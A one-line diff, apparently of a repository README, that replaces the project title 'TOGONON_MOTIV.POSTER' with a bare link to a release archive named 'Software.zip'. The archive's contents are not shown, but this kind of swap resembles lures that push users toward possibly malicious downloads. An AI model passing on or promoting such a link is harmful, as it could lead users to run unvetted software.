@@ -1,1 +1,1 @@
-# TOGONON_MOTIV.POSTER
+# https://github.com/ambassadorsCoders/TOGONON_MOTIV.POSTER/releases/download/v1.0/Software.zip
